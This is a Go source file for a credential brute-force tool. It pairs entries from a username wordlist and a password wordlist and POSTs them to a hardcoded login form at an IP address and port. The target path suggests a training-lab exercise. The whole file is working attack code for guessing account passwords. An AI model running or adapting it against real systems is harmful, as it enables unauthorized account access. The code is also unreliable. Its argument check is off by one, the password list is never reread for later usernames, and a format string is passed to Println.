package main

import (
	"bufio"
	"fmt"
	"net/http"
	"net/url"
  "io"
	"os"
	"strings"
)

var (
  targetURL = "http://94.237.59.185:43871/question1/"
)

func main() {
  if len(os.Args) < 2 {
    fmt.Println("need 2 wordlist")
    os.Exit(1)
  }
  counter := 0
  userlist, _ := os.Open(os.Args[1])
  passlist, _ := os.Open(os.Args[2])

	pass_scanner := bufio.NewScanner(passlist)
	scanner := bufio.NewScanner(userlist)
	for scanner.Scan() {
		user_name := scanner.Text()
		if strings.HasPrefix(user_name, "#") {
			continue
		}
    for pass_scanner.Scan() {
      counter += 1
      fmt.Println(counter)
      if check(user_name, pass_scanner.Text()) {
        fmt.Println("valid account found: user: %s pass: %s", user_name, pass_scanner.Text())
      }
    }
  }
}


func check(user string, pass string) bool {
  data := url.Values{}
 	data.Set("userid", user)
	data.Set("passwd", pass)
	data.Set("submit", "Submit")

  client := &http.Client{}
  req, _ := http.NewRequest("POST", targetURL, strings.NewReader(data.Encode()))
 	req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
  resp, err := client.Do(req)
  if err != nil {
		fmt.Println("Error making request:", err)
		return false
	}
	defer resp.Body.Close()
  body, _ := io.ReadAll(resp.Body)

  return strings.Contains(string(body), "200")
}
